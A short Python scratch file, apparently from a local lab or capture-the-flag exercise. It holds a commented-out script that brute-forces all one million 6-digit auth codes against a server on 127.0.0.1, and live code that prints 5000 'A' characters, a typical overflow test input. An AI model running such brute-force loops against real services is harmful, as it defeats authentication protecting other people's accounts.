# import requests
# import time
# # Base URL
# base_url = "http://127.0.0.1:8888/"

# # Iterate through all possible 6-digit codes
# end = 1000000
# start = 0
# curr_time = time.time()
# for code in range(start, end):  # 000000 to 999999
#     auth_code = f"{code:06d}"  # Format as zero-padded 6-digit string
#     url = base_url + auth_code + "/"  # Construct the request URL

#     try:
#         response = requests.get(url)

#         if response.status_code == 200:
#             print(f"Found valid auth code: {auth_code}")
#             print(f"Response Status Code: {response.status_code}")
#             print(f"Response Body: {response.text}")
#             #break  # Stop searching once a valid code is found
        
#         print("Tried auth code:", auth_code)

#     except requests.exceptions.RequestException as e:
#         print(f"Error connecting to {url}: {e}")
        
# print(f"Time taken: {time.time() - curr_time}")
def generate_a_string(length):
    return 'A' * length

# Example usage
a_string = generate_a_string(5000)
print(a_string)
